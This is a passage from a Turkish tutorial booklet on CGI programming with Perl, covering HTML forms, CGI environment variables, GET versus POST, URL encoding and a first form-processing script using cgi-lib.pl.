Bu kitapçığı yazarken, hemen hemen sonuna geldiğim sırada, Selçuk Üniversitesi Teknik Eğitim Fakültesi Bilgisayar Sistemleri Öğretmenliği bölümünde öğretim görevlisi Sayın Adem Güneş’in Perl ve Perl ile CGI Programlama ders notlarının farkına vardım. Bu notları http://alaeddin.cc.selcuk.edu.tr/~adem/ adresinde bulabilirsiniz. Bu kitapçığın ileri bir aşamasına gelmemiş olsaydım, Sn. Güneş’in ders notlarını gördükten sonra boşuna zahmet etmezdim!

Bazı Türkçe kaynak tarama çabamı kolaylaştıran genç kuşak sayısal tasarımcı ve Web Yönetmeni arkadaşlarım K. Emre Güray ve Argıt Usuğ'a katkıları için teşekkür ederim.

Bu kitapçığı, Erhan Mataracı’ya ve liselerinin Web sitesini kuran, yöneten ve Perl programını yazmak için kolları sıvayan diğer kardeşlerime armağan ediyorum. Ama sınıflarını geçmeleri şartıyla!

## **HTML-CGI İlişkisi**

CGI’a ilk adımımızı HTML’in FORM etiketine ilişkin bilgilerimizi atmak çok lyerinde olur. Çünkü Internet’te istemci ile sunucunun bilinçli şekilde etkileştikleri nokta CGI ise, ikisini bu noktada buluşturan ögeler, HTML’in Form ve Anchor (<A>) etiketleridir. Form etiketi bir formdaki <Input> değerlerini, <A> etiketi ise Browser’i CGI programına gönderir.

HTML ile yazılmış ve görüntülenmek üzere Browser programlarına gönderilen metinler başlık ve gövde olmak üzere iki bölüme ayrılır. Başlık bölümü <HEAD>...</HEAD> etiketlerinin, gövde bölümü ise <BODY>...</BODY> etiketlerinin arasında kalır. Bir HTML belgesinin başlık bölümünde yer alan bilgilerin büyük bölümü Browser’da görüntülenmez; ancak Browser bu bölümdeki bilgilere bakarak, HTML belgesini tanır; bu belgeyi nasıl görüntüleyeceğini öğrenir. Gövde bölümünde ise ziyaretçinin Browser programının görüntülemesini istediğimiz verileri ve bunların nasıl görüntüleneceğine ilişkin kodlarımız yer alır. Bu kodların hemen hepsi, bizim, yani Web sayfası tasarımcısının ziyaretçimize göndermek istediğimiz veriler ve bunların görüntülenmesine ilişkindir; bizden ziyaretçiye, Sunucu’dan İstemci’ye doğru giden bilgilerdir.

FORM ve onun içinde yer alan INPUT etiketleri ise, tersine işler: istemciden sunucuya, ziyaretçiden tasarımcıya veri taşır. HTML’in ilk sürümünde Form ve Input etiketleri yoktu; <ISINDEX> etiketi ile ziyaretçi sadece sitede arama yapabilirdi. Ancak hiç bir Browser (ki o zaman sadece Mosaic vardı!) tarafından tam uygulanmamış olan bu etiketin yerine HTML’in daha sonraki sürümlerinde istemcinin sunucuya daha çok bilgi gönderebilmesini sağlayan Form ve Input etiketleri geldi. CGI programlarımızı, yukarıdaki örnekte olduğu gibi adreslerini doğruca Browser’ın URL adres kutusuna yazarak da çağırabiliriz. Fakat CGI programlarını çalıştırmanın en yaygın yolu Form etiketidir. Bunu Form etiketinin ACTION özelliği (attribute) yapar. Hatırlarsanız, FORM etiketini şöyle yazarız:

<FORM ACTION=”cgi-programı” METHOD=\[“POST” | “GET”\]>...</FORM>

Burada Form etiketinin ACTION özelliğinin karşısına CGI programımızın adını, Örneğin, Perl programının dosya adının uzantısına göre, ACTION=”/cgi-bin/merhaba.pl” veya ACTION=”/cgi-bin/merhaba.cgi” yazarız. İstemcinin Form bilgilerini CGI programımıza hangi yöntemle ulaştıracağını belirleyen “Get” ve “Post” özelliklerinin farklarını birazdan ele alacağız. Şimdilik bunu atlayalım. Bu arada Form etiketinin başka özellikleri de vardır; bunlardan “Accept=” ile form bilgisini işleyecek olan Server’a, gönderilen verinin hangi dosya türüne girdiğini, “Enctype=” ile gönderilen verinin nasıl şifrelendiğini bildiririz.

Form etiketinin içinde, onun eylemi (Action) ve yöntemi (Method) ile gönderilecek bilgileri derlemeye yarayan başka etiketler bulunur. Şimdi kısaca onları ele alalım:

Bir Internet sitesi ziyaretçisinden Input etiketi aracılığıyla tam on ayrı tür bilgi alabiliriz. Input etiketi şöyle yazılır:

<INPUT NAME=”Bu alanın adı” TYPE=\[TEXT | PASSWORD | CHECKBOX | RADIO | SUBMIT | RESET | FILE | HIDDEN | IMAGE | BUTTON\] VALUE=”Alfanümerik değer” SIZE=”girdi\_kutusu\_genişliği”>

Input etiketinin kapanmadığını (yani </INPUT> şeklinde bir etiket olmadığını) ve girdi tipine göre daha başka özellikleri bulunabileceğini hatırlayalım.

Input etiketi ile sunucuya, onun arıcılığıyla CGI’ya gelen bilgiye programcılık dilinde değişken denir. Değişkeni, sabit bir adı olan fakat içeriği değişebilen bir bilgi tutucu öge olarak düşünebilirsiniz; bir tür kap. Input’un oluşturduğu değişkenin adı, etiketin NAME (ad) özelliğinden alınır; yani Input’a ad verirken, daha sonra bu adla bir değişkeniniz olacağını düşünmelisiniz. Bu değişkenin değeri ise Ipnut’un türüne göre değişir. Örneğin, TEXT (metin) türü Input’un değeri, Browser’da oluşturacağı kutuya Internet ziyaretçimizin yazacağı kelimelerdir. Input etiketini yazarken VALUE (değer) özelliğini de yazmışsak, (ve ziyaretçinin bunu değiştirmesi olanağı yoksa), değişkenin değeri VALUE özelliğinin karşısına yazdığımız alfanümerik (rakam, harfler veya her ikisi birden) metindir.

Bir Form’un içindeki bilgilerle, ziyaretçinin Browser’ından (istemci) kalkıp, bizim Web Server’ımıza ve oradan da CGI’a gelmesi için, genellikle ziyaretçinin ya klavyesinde Enter tuşuna basması ya da tipi Submit (Gönder) olan ve Browser tarafından düğme simgesiyle görüntülenen bir başka Input’u tıklaması gerekir. Fakat “gönder” düğmesi de bir Input olduğu için Form etiketi, içindeki bilgileri paketleyip gönderirken Submit’in (varsa) değerini de gönderir.

Şimdi “paketleyip gönderme” olayı üzerinde duralım; çünkü hemen hemen tüm CGI kavramı, bu Internet ziyaretçimizden gelen bu “şey” üzerine kurulacak. CGI programlarımız ziyaretçiden “girdi” olmadan da çalışabilir. Nitekim yukarıda yazdığımız ilk Perl programı ziyaretçinin bir bilgi vermesini gerektirmiyordu. Fakat CGI programı, ziyaretçinin IP adresini, öğrenip, kendisine bildirilyordu. IP numarası, ziyaretçinin sadece bu CGI programını çalıştırmak üzere programın adını Browser’ının adres hanesine yazması ve Enter’a basması (veya yeni Browser’lardaki Go/git düğmesini tıklaması) ile Browser tarafından CGI’a gönderilmiş bir bilgidir. Bu yüzden CGI, ziyaretçi isteyerek ve bilerek Server’a bilgi göndermese de Server ziyaretçiden bilgi edinmesini ve bunu CGI programımıza vermesini bilir! Şimdi bu bilgilerin neler olduğunu görelim.

CGI programına Server tarafından iki tür bilgi verilir:

1. Browser, Server ve kendisini hakkındaki bilgiler: Browser’ın türü, yetenekleri, Browser’ın Internet’e giriş noktası (Remote Host, kullanıcı açısından ISS), Server’ın türü, Internet’e bağlandığı geçit (Port), CGI programının adı, bulunduğu dizin, sahip olduğu değişkenler gibi bilgiler, CGI’a çevre değişkenleri (Enivonment Variables) kümesi olarak ulaştırılır (Bu değişkenlere bazı kaynaklarda Ortam Değişkenleri denildiğini görebilirsiniz..

2. Kullanıcının (Internet ziyaretçisinin) girdiği bilgiler: Kullanıcı Browser penceresinde bir Form doldurmuş ise Form’daki değişkenler ve değerleri (Input etiketlerine verdiğimiz adın değişken adı, bizim verdiğimiz veya kullanıcının girdiği değerlerin de değişkenin değerini oluşturduğunu yukarıda görmüştük) de CGI programına aktarılır. Bu aktarma işlemi iki türlü yapılabilir. Form’un METHOD özelliği GET ise bu bilgiler yukarıda belirttiğimiz çevre değişkenlerine katılarak verilir; METHOD olarak POST kullanmışsak, bu bilgiler standart girdi (standart input veya Perl’ün ifadesiyle stdin) olarak gönderilir.

CGI programcısı olarak yapacağımız işin özü, bu iki grup değişkeni alıp, içeriklerini kullanılır hale getirmek ve kullanmaktan ibarettir. Burada ifade ettiğimiz “almak,” “kullanılır hale getirmek” ve “kullanmak” ifadelerine dikkat edin: çünkü CGI programı ile sadece bu üç işi yapacağız. Dolayısıyla neyi alabileceğimi, nasıl alabileceğimizi öğrenerek işe başlamak zorundayız. Perl, bir programlama dili olarak bize bu üç işte kullanabileceğimiz komutları sağlar; fakat bu komutlarlı kullanarak hangi bilgi ile ne yapacağımızı bilmemiz gerekir.

**Çevre Değişkenleri**

Aşağıda bir liste göreceksiniz; bu listede bir CGI programının içinde bulunduğu çevrenin bütün önemli bilgileri yer alıyor. Ama şimdi bu listeye geçmeden, biz kendi bilgisayarımızdan kendi CGI çevremizin değişkenlerini ve değerlerini öğrenelim. Şimdi, açın en sevdiğiniz düzyazı programını ve başlayın yazmaya (Eğer illâ kelime iişlem programı kullanmaya kararlıysanız, metni düzyazı, salt metin, ASCII, ANSI veya “Text only” olarak kaydetmeyi unutmayın):

**print "HTTP/1.0 200 OK\\n";**

**print "Content-Type: text/html\\n\\n";**

**print "<HTML>\\n";**

**print "<HEAD>\\n";**

**print "<TITLE>CGI Cevre Degiskenleri</TITLE>\\n";**

**print "<meta http-equiv=\\"content-type\\" content=\\"text/html; charset=ISO-8859-9\\">\\n";**

**print "<meta http-equiv=\\"Content-Type\\" content=\\"text/html; charset=windows-1254\\">\\n";**

**print "</HEAD>\\n";**

**print "<BODY>\\n";**

**print "<P>\\n";**

**print "<H1>CGI Çevre Değişkenleri ve Değerleri</H1>\\n";**

**foreach $env\_var (keys %ENV) **

** {**

** print "<B>$env\_var</B> = $ENV{$env\_var}<BR>\\n";**

** }**

**print "</BODY>\\n";**

**print "</HEAD>\\n";**

**print "</HTML>\\n";**

Sonra bu metni örneğin cevre.pl (veya kişisel Web Server’ınızın “.pl” uzatması gibi “.cgi” uzatmasını da Perl dosyası saymasını sağladıysanız, cevre.cgi) adıyla, kişisel Server’ınızın kök dizinine (Windows ortamında muhtemelen c:\\inetpub\\wwwroot olmalı) kaydedin. Ve Browser’ınızın URL adresi hanesine Server’ınızın protokol ve yol adıyla birlikte bu dosyanın adını yazın (örneğin: http://benim\_server/cevre.pl), klavyede Enter’a basın.

<cgi-perl007.tif>

İşte sizin kişisel Web Server’ınızın cevre.pl veya cevre.cgi programına sağladığı ortam! Bütün değişkenlerinizi ve değerlerini görüyorsunuz. Muhtemelen kendi bilgisayarınızın burada görüntülenen bir çok özelliğini tanıdınız: Autoexec.bat dosyasındaki Path satırının değerini, bilgisayarınızın ve dolayısıyla kişisel Server’ınızın adını, hatta bu programı Windows ortamında çalıştırdıysanız, Windows’un sürümünü bile görüyorsunuz. CGI, bunları nereden biliyor? Kişisel Web Server’ınız ona bildirdiği için. Kişisel Web Server bunu CGI nasıl bildiriyor? Çevre Değişkenleri kümesi ile.

//////////////////KUTU/////////////////

**“Shebang” nereye gitti!**

Kim nereye gitti? Madem ki Perl öğreniyoruz, öğleyse yılların Unixçisi gibi konuşmaya da alışmamız gerek: # ve ! işaretleri Unix işletim sistemine, aşağıdaki Script’i (betik’i) Perl yorumlayıcısı ile yorumlamasını ve bu yorumlayıcının nerede bulunduğunu bildirir. “Shebang” \[şi-beng\] denmesinin sebebi de müzikte kullanılan diyez (#) işaretinin “Sharp,” ünlem (!) işaretinin de “bang” diye okunmasından kaynaklanır; ikisine birarada shebang denir. Bu komut satırı genellikle şöşle yazılır:

#!/usr/local/bin/perl

Bununla Unix işletim sistemine Perl yorumlayıcısının kök dizinde, usr klasöründe, local alt-klasöründeki bin alt-alt klasöründe olduğunu belirtmiş oluruz. Windows ortamında buna gerek yok; çünkü kişisel Web Server’ımızı kurduktan sonra Registry kayıtlarında Browser’lara ve diğer ilgili programlara Perl konusunda kimden nasıl yardım isteyecekleri gösteren değişlikler yapmıştık.

Bununla birlikte, yazacağınız Perl programları kendi bilgisayarınızda ve Windows işletim sisteminde değil, büyük bir ihtimalle Web sitenize evsahipliği yapan firmanın bilgisayarında ve Unix sisteminde çalışacak. Dolayısıyla CGI programlarınızda Shebang’e ve Perl’ün yerini belirten ilk satıra ihtiyacınız olacak. Bundan böyle, kendi bilgisayarımızda ihtiyaç olmasa da elimizi alıştırmak için örnek kodlarımızda Shebang’e yer vereceğiz. Bunun Windows ortamında hiç bir zararı olmaz. Server’a gönderdiğiniz CGI programlarınız işlemezse, önce birinci satırda Shebang bulunup bulunmadığına ve yazdığınız yolun doğru olup olmadığına bakın. Perl yorumlayıcısının nerede bulunduğunu Server operatörüne sorabilirsiniz.

////////////////////////////////////////////////////KUTU BİTTİ/////////

Kendi bilgisayarımızda CGI’ın çalıştığı çevrenin bu kadar çok değişkeni ve değeri olmasına rağmen, normal durumlarda CGI programlarımızda bu değişkenlerin tümünü kullanmayız. CGI programlama açısından önemli çevre değişkenleri ve değerleri şöyle sıralanır:

**ÇEVRE DEĞİŞKENİ ANLAMI**

REMOTE\_ADDR İstemci bilgisayarın IP adresi

REMOTE\_HOST İstemcinin bilgisayarının adı (Muhtemelen yine istemcinin IP’si)

HTTP\_ACCEPT Browser’ın tanıyabileceği MIME türleri

HTTP\_USER\_AGENT Browser hakkında bilgi (adı, sürümü işletim sistemi, vs.)

HTTP\_REFERER Browser’ın bizim sitemize gelmeden önce görüntülediği son URL (Burada “referer” referansta bulunan, köprü veren, gönderen anlamına gelmekle birlikte, sitemizi ziyaret eden kullanıcının sizim sitemize geçtiği son sitede bizim sayfamıza bir köprü bulunduğu anlamı çıkmaz; ziyaretçi bizim adresimizi URL adres kutusuna kendisi yazsa bile, HTTP\_REFERER değişkeninin değeri olarak son URL kaydedilir.)

REQUEST\_METHOD GET veya POST

CONTENT\_LENGTH POST yoluyla gönderilmiş bilginin boyutu (büyüklüğü). GET yöntemi kullanıldığında veya istemci bilgi göndermediğinde tanımlanmamış sayılır)

QUERY\_STRING İstemcinin GET yoluyla gönderdiği bütün bilgilerden yapılmış bilgi yumağı (String)

PATH\_INFO CGI programının çalıştırıldığı dizine göre (göreli) Path (arama yolu) bilgisi.

PATH\_TRANSLATED Göreli arama yolunun gerçek disk ve dizin adlarıyla ifadesi

Şimdi bu listeye göre kendi kişisel Web Server’ınızın verdiği bilgileri yorumlayabilirsiniz; fakat çok sık kullanacağımız iki değişkenin, CONTENT\_LENGTH ve QUERY\_STRING değişkenlerinin tanımlanmamış ve boş olduğunu görüyor olmalısınız.

**Yöntem Farkı: GET ve POST**

CONTENT\_LENGTH ve QUERY\_STRING değişkenlerinin doğrudan bizim Form etiketimizin METHOD özelliğine bağlı olduğunu farkettiniz mi? METHOD olarak GET veya POST kullanabiliriz. Bu, bizim ziyaretçimizden nasıl ve ne boyutta bilgi alacağımızı ve bilginin CGI programına nasıl aktarılacağını belirler.

Form’un oluşturduğu ve sizin GET yöntemi ile aldığınız bilgiler, çevre değişkenlerinden QUERY\_STRING değişkeninin içine yazılır. Başka bir ifade ile Form’daki bütün değişkenlerin adları ve bu değişkenin içerdiği değer yumak yapılır (bu yumağın niteliğine ve nasıl çözeceğimize geleceğiz!) ve Server’da QUERY\_STRING değişkeninin değeri olarak yazılır. Daha sonra belirteceğiz, ama şimdiden bir kenara yazın: Form’un gönderdiği değişkenler ve değerleri artık düz metin haline gelmiştir; bundan yeniden program yoluyla kullanılabilir değişkenler üretmek ve bu değişkenlere ziyaretçiden gelen değerleri atamak bizim işimiz olacak (ve galiba Perl ile CGI progralamanın da en can alıcı noktasını oluşturacak!).

Form’un bilgilerini POST yoluyla almış olsaydık bunlar CGI programı için standart girdi (stdin) olarak gelecekti. Bu iki yöntem arasındaki başlıca fark (ve herkesin POST yöntemini tercih etmesinin sebebi) stdin’in bilgi tutma kapasitesinin sınırsız olmasından ibarettir. QUERY\_STRING değişkeni, Server’a, ve bu programın ayarlarına göre sınırlı boyutta bilgi tutabilir. Formlarınızda çok alan (yani çok değişken ve çok değer) varsa, mutlaka POST yöntemini kullanmalısınız. Aksi taktirde, bu bilgilerin QUERY\_STRING değişkeninin bilgi tutma kapasitesini aşan bölümü, Server tarafından silinir, CGI programına aktarılmaz.

Çevre değişkenlerimizden REQUEST\_METHOD, Form’dan bilgilerin hangi yöntemle geldiğini gösterdiğinize göre, CGI programımızı yazarken, önce bu değişkenin içeriğini kontrol edebiliriz; bu GET ise, demek ki Formun bilgileri QUERY\_STRING değişkeninin içinde paket halinde duruyor. REQUEST\_METHOD değişkenin değeri POST ise, ziyaretçimizin Formumuza yazdığı bilgiler, stdin olarak gelmiş ve stdin’in o andaki boyutunu gösteren bilgi de CONTENT\_LENGTH değişkenine işlenmiş demektir. Bunları tekrar ediyoruz; çünkü birazdan bu bilgilerin tümününden, Form bilgilerini kullanılır hale getirirken yararlanacağız.

**Bilgi Yumağı**

Peki, bu kadar teori yeter; şimdi bir deney daha yapalım. Hem Form bilgimizi tazeleyelim, hem de Form’dan gelen bilginin nasıl yumaklandığını görelim. Açın Not Defterini veya onsuz olamadığınız düz yazı programını ve başlayın yazmaya:

**<HTML>**

**<HEAD>**

**<TITLE>FORM ORNEGI</TITLE>**

**<meta http-equiv="content-type" content="text/html; charset=ISO-8859-9">**

**<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">**

**</HEAD>**

**<BODY>**

**<FORM ACTION="isim-yas.pl" METHOD=POST>**

**Adınız: <INPUT TYPE=text NAME="isim"><p>**

**Yaşınız: <INPUT TYPE=text NAME="yas"><p>**

**<INPUT TYPE=submit VALUE="Gönder">**

**</FORM>**

**</BODY>**

**</HEAD>**

**</HTML>**

Bitirince, bu belgeyi isim-yas.htm adıyla kaydedin, fakat kapatmayın; Form etiketinin her iki özelliğini silin; etiket tek başına (<FORM>) kalsın. Bu dosyayı yeniden fakat adını değiştirerek, örneğin isim-yas-gecici.htm adıyla, kaydedin. Tamam mı? Şimdi ikinci kaydettiğiniz geçici HTML dosyasını Browser’ınızda açın. Adınızı ve yaşınızı yazın; Gönder düğmesini tıklayın ve Browser’ınızın Adtres hanesine bakın:

<cgi-perl008.tif>

Burada şuna benzer bilgi yumağını görüyor olmalısınız:

“isim=Mustafa+Durcan&yas=23”

Bu, Form’daki değişkenlerin (“isim” ve yas”), Formu dolduran kişi tarafından verilen değerlerle birlikte Server’a, oradan da CGI programına sunuluş biçimidir. Browser, bir Form’un Input’larının adları ile bu alana yazılan değerleri, bir String (bağ) haline getirir; ve Server’a gönderir. Bu String’in oluşturulmasında şu kuralların izlenmiş olduğuna dikkat edin:

1. Değişken adları kendilerine ait değerle eşittir (=) işaretiyle birleştiriliyor;

2. “değişken=değer” çiftleri “ve” anlamına gelen Ampersand (&) işaretiyle birbirine ekleniyor;

3. Değerin içinde boşluk varsa yerine artı (+) işareti konuyor.

Bu işleme “URL Encoding” sistemi denir; buradaki örnekte görülmemekle birlikte, standart ASCII karakterler dışındaki harfler ve işaretler yüzde (%) işareti ve heksadesimal (16 tabanlı) kodlara çevrilir.

////////////////////////KUTU/////////////////////

Hexadecimal Türkçe!

URL Encoding şemasında, Türkçe karakterlerin kodları şöyledir:

ğ: F0

Ğ: D0

ı: FD

İ: DD

ü: FC

Ü: DC

ş: FE

Ş: DE

ö: F6

Ö: D6

ç: E7

Ç: C7

(URL Encoding şemasına göre, yüzde işareti “%25”, Ve (&) işareti “%26” ve çiftçatal (#) işareti ise “%23” olarak şifrelenir.)

///////////////////KUTU BİTTİ////////////////

Bu deneyi yapmakla, Browser’ın Form’daki bilgileri Server’a nasıl gönderdiğini görmüş olduk. Şimdi bu bilgi yumağını açan bir CGI programı yazalım. Bu sizin ilk form işleme programınız olacak! Evet, Not Defteri gibi bir programı açarak, yazmaya başlıyoruz:

**#!/usr/local/bin/perl**

**# isim-yas.pl**

**require 'cgi-lib.pl'**

**&ReadParse(\*girdi);**

**print "Content-Type: text/html\\r\\n\\r\\n";**

**print "<HTML>\\n";**

**print "<HEAD>\\n";**

**print "<TITLE>ISIM-YAS</TITLE>\\n";**

**print "<meta http-equiv=\\"content-type\\" content=\\"text/html; charset=ISO-8859-9\\">\\n";**

**print "<meta http-equiv=\\"Content-Type\\" content=\\"text/html; charset=windows-1254\\">\\n";**

**print "</HEAD>\\n";**

**print "<BODY>\\n";**

**print "<P>\\n";**

**print "Merhaba, " . $girdi{'isim'} . ". Sen\\n";**

**print $girdi{'yas'} . " yaşındasın.<p>\\n";**

**print "</BODY>\\n";**

**print "</HEAD>\\n";**

**print "</HTML>\\n";**

Yazmayı bitirince bu kodu “isim-yas.pl” adıyla kaydetmek zorundasınız. Neden? Çünkü bu programı çağıracak veya çalıştıracak olan bir önceki HTML kodunda Form etiketinde ACTION hanesine bu adı verdik. “isim-yas.htm” sayfasında Form’u dolduran kişi Gönder düğmesini tıkladığı anda, Browser Server’a, “Sizin oralarda ‘isim-yas.pl’ adında bir CGI programı olacak.. Şu yumak yaptığım bilgileri ona verir misin, lütfen?” diyecek; Server, bu isimli CGI programını arayacak; bulamazsa Browser’a hata mesajı gönderecek; bulursa CGI programına “Al bakalım, sana bir yumak bilgi geldi; ne yapacaksan, yap!” diyerek, ziyaretçinin gönderdiği bilgileri devredecektir. Dıolayısıyla Form’un ACTION hanesine adını yazdığımız CGI programının belirtilen yerde olmasını sağlamak Web Tasarımcısı olarak bizim görevimiz.

(CGI programcıları Perl programı yazarken, kodun başına dosyanın kendi adını da yazarlar. Burada gördüğünüz örnekte Shebang’inin hemen altındaki “# isim-yas.pl” satırı, programcının kendisi ve daha sonra bu kodu irdeleyecek veya kullanacak kişiler için aldığı bir güvenlik önlemidir.)

Biz de birazdan kodumuzu irdeleyeceğiz; ama önce “isim-yas.htm” sayfasını Browser’ınızda açın; Form’u doldurup, gönder düğmesini tıklayın; şuna benzer bir karşılık almış olmalısınız:

<cgi-perl009.tif>

**Yumağı açalım**

Yukarıda, CGI programlarıının yaptığı işleri kavramsal olarak belirtirken, “bilgi yumağını açma” işinin Perl programının aslî görevlerinden biri olduğunu kaydetmiştik. Yazdığımız Perl programı bunu yaparak, kendisine String halinde gelen (örneğin: “isim=Mustafa+Durcan&yas=23”) bilgiyi kullanılabilir hale getiriyor. String halindeki verinin kullanılır hale getirilmesine Parsing (dilbilgisi bilimindebir cümleyi gramer bakımından incelemek anlamına gelir) denir. Form’dan gelen ve adeta birbirine girmiş ve hatta şifrelenmiş olan değerlerin açılması, eşittir (=) işaretinin solundaki kelime, rakam veya işaretin değişken adı, sağındakilerin değişkenin değeri haline getirilmesi gerekir. Bu arada artı (+) işaretinin yerine boşluk konması, önünde yüzde işareti bulunan iki karakterin URL Encoding şemasına göre harfe veya işarete çevrilmesi şarttır. Aksi taktirde değerlerimizi kullanamayız. (“Sizin adınız Hakk%FD+%D6cal’dır” diye bir karşılık verdiğimizi düşünebiliyor musunuz?)

Fakat biz Web amaçlı CGI programcıları bu bakımdan şanslıyız; çünkü ciddî programcılık amacıyla Perl öğrenmiş Steven K. Brenner gibi uzmanlar, oturmuş bir CGI programına GET veya POST yöntemiyle gelebilecek verileri inceleyip, değişken=değer çiftlerini ortaya tıkartan ve bunu Perl’e dizi değişken olarak öğreten program parçacıkları yazmışlar. Bizim bütün yapacağımız, Perl Kitaplığı (Library) adı verilen bu program parçacıklarını kendi Perl programımızda kullanılır hale getirmektir. Böyle, dışarıdaki bir Perl programını kendi programımızın içinde kullanmak istersek, kendi programımızın başında Perl yorumlayıcısına (örneğin perl.exe) bizim programı icra etmeye başlamadan önce dışarıdaki bu kitaplığı alıp, çalıştırmasını bildirmemiz gerekir. Buradaki örneğimizde bunu, “require 'cgi-lib.pl'” satırı ile yapıyoruz. Bu satırdaki require komutu, bizim bilgisayarımızdaki perl.exe’ye veya Server’ın bulunduğu bilgisayardaki Perl yorumlayıcısına işe başlamadan önce “cgi-lib.pl” adındaki Perl programını çalıştırmasını bildiriyor. “cgi-lib.pl” programını Steven K. Brenner 1995’te yazarak Prel programcılarına armağan etmiş bulunuyor. (Bu programı, bu kitapçığın örnek dosyaları arasında bulabilirsiniz.)

“cgi-lib.pl” programında bir kaç fonskiyon tanımlanmış bulunuyor. Perl’ün defalarca yapması gereken işleri, bu işin yapılması için gerekli bilgi kümesi ve komutlarla birlikte bir grup haline getirir ve bu gruba bir isim verirsek ortaya bir fonksiyon çıkartmış oluruz. Sözgelimi, Perl’e “Filanca yerdeki şu String’i al; içindeki filanca işareti bul; eğer bu işaret şuna eşitse, önündeki grubu dizi değişken adı yap...” diye bir dizi komut verebilirdik. Fakat bu hem yorucu olurdu; hem de hata yapma olasılığımızı arttırmaya yarardı. Oysa, “cgi-lib.pl” programında Parsing işlemi için geliştirilmiş fonksiyonlar var. Biz bu fonksiyonların yaptığı iş kümesine ihtiyaç duyduğumuz yerde kendi yazdığımız Perl programına “Steven’ın programındaki filanca fonksilonu al, ne emrediyorsa yap, sonucu da gel bana bildir!” dersek, işlerimiz daha kolay hale gelmiş olur.

İşte bu tür, bir isim altında toplanmış işlem paketlerine Function (işlev) adı verilir; Perl diğer bütün programlar gibi kendisine “Şu fonksiyonu yap!” dediğiniz noktada yapmakta olduğu işi durdurur ve fonksiyon paketindeki işleri yapar; bu paket ortaya bir değişken veya sonuç çıkartıyorsa, o bilgiyi edinmiş olarak yarım bıraktığı işleme geri döner. Fonksiyon yazmamızdaki veya hazır fonksiyonları kullanmamızdaki birinci sebep, Perl’e, Fonksiyon’un sağlayacağı bilgiyi kazandırmaktır.

Perl’ün yukarıdaki örneklerde kullandığımız bazı komutları, örneğin “print” komutu aslında Fonksiyon diye adlandırılır; eğer biz bir fonksiyon yazıyorsak, buna subrutin (subroutine) denir. Daha sonra subrutin yazmayı göreceğiz; şimdi sadece Steven’ın (veya kendi Perl’ümüze eklediğimiz herhangi bir haricî kitaplık dosyalarındaki) subrutinlerine nasıl atıf yaptığımıza dikkat edelim. “cgi-lib.pl” programında tanımlanmış olan “ReadParse” subrutin’i, GET veya POST yoluyla alınmış veriyi okur ve bunları—türünü ve niteliğini daha sonra göreceğimiz—dizi değişkenlerin (array) içine yazar. Perl işine iyice ısındığımıza göre, bu dilin kendi argosunu öğrenebilmek için belirtelim: Perl’de buradaki gibi dışarıdan aldığımız “değişken=değer” çiftlerine “anahtar/değer” denir; “değişken” adı Perl’ün kendi içinde oluşturduğu veri tutma alanları için kullanılır.

Perl programcılık çevrelerinde bir çok kitaplık-program bulabilirsiniz; cgi-lib.pl’nin en çok kullanılan kitaplık olmasının sebebi, anahtar/değer dizisinin yazılacağı değişkenin adını bizim verebilmemizdir. cgi-lib.pl’in GET veya POST verisini okuyan ve irderelen subrutininin adı ReadParse’dır; dolayısıyla bu subrutine biz &ReadParse şeklinde göndermede bulunuruz. Bu gönderme “&ReadParse(\*girdi);” şeklinde yapılır. Bu komutla, cgi-lib.pl programına “Benim GET veya POST verilerimi okuyur, anahtar/değer çiftlerini bul; bunları ‘girdi’ isimli dizi değişkenin içine yaz!” demiş oluyoruz. Form’un bulunduğu HTML sayfasını tasarlayan biz olduğumuza göre, Input etiketlerimizin adlarını (yani CGI’da anahtar/değer çiftinde anahtar olacak kelimeleri biliyoruz. (Buradaki örnekte, “isim” ve “yas”.) Eğer “isim” adlı anahtarın değerini bilmek istiyorsam, bütün yapacağım şey, ‘girdi’ dizi-değişkeninin “isim” ve “yas” adlı anahtarlarının değerlerini sorgulamaktan ibaret. Bunu “$girdi{'isim'} “ ve “$girdi{'yas'}” ifadeleriyle yapıyoruz. Fakat henüz Perl’ün yapı taşları olan değişkenleri tanımadığımız için, bunun üzerinde durmuyoruz. O da ilerde!

//////////////////////////////KUTU/////////////////////////////////

**İki önemli HTML etiketi**

CGI’ın HTML’in Form ve Input etiketleri ile yakından ilgili olduğunu gördük; ne var ki HTML ile işimiz bitmedi. Gerçekten de HTML belgesindeki bir çok etiket, CGI programımızla ilgili olabilir veya biz CGI programıyla oluşturduğumuz HTML belgelerinde bu etiketleri ve içeriklerini yazabiliriz. CGI tasarımcısı için HTML bilgisi çok önemlidir. Burada bazı HTML etiketlerine ilişkin bilgilerimizi kısaca tekrar edelim. HTML’i çok iyi bilseniz de burada ele alacağımız etiketlerin CGI açısından önemi üzerinde duracağımız için bu bölümü atlamasanız, iyi olur.

**<BASE> Etiketi**

Bir belgede daha sonra belirtilecek kaynakların aranması gereken temel URL’i gösterir. Diyelim ki HTML belgesinde bir resme yer veriyorsunuz. HTML dosyasını siz yazdığınızda bunu muhtemelen şöyle yazarsınız:

<IMG SRC=”cicekler.png”>

Web Server “cicekler.png” dosyasını da HTML ile birlikte Browser’a gönderebilmek için bu resmi ona atıf yapılan HTML dosyası ile aynı dizinde arayacaktır. Böyle bir HTML etiketini CGI programı yoluyla yazdırırsanız, muhtemelen şöyle bir Perl kodu yazacaksınız:

print "<IMG SRC=\\”cicekler.png\\”>\\n";

Şimdi, eğer daha sonra önereceğimiz güvenlik önlemlerini yerine getirir ve bütün Perl dosyalarını sitenizin kök dizininde /cgi-bin/ alt-dizininde toplarsanız, Server bu kez resim dosyasını CGI programınızın durduğu dizinde arayacak; ve büyük bir olasılıkla bulamayacaktır. BASE etiketi, Server ve Browser’a bütün bölge için geçerli bir temel hareket noktası veya temel dizin vermeye yarar. HTML belgesinin başlık bölümünde şöyle bir etiket yazarsanız, Server da, Browser da, neyi nerede arayacaklarını bilmiş olurlar:

<BASE HREF=”http://benim\_sitem.com.tr/resimler/”>

CGI programlama kolaylığı bakımından düşünmeseniz bile, her resim için ayrı ayrı:

print “<IMG SRC=\\”http://benim\_sitem.com.tr/resimler/cicekler.png\\”>\\n”;

yazmaktan kurtulursunuz. Kaldı ki, resimlerinizi bir başka dizine aldığınızda sitedeki bütün kodları tek tek düzeltmektense, sadece CGI programınızın bir satırını düzeltmek daha kolay olmalı.

**<META> Etiketi**

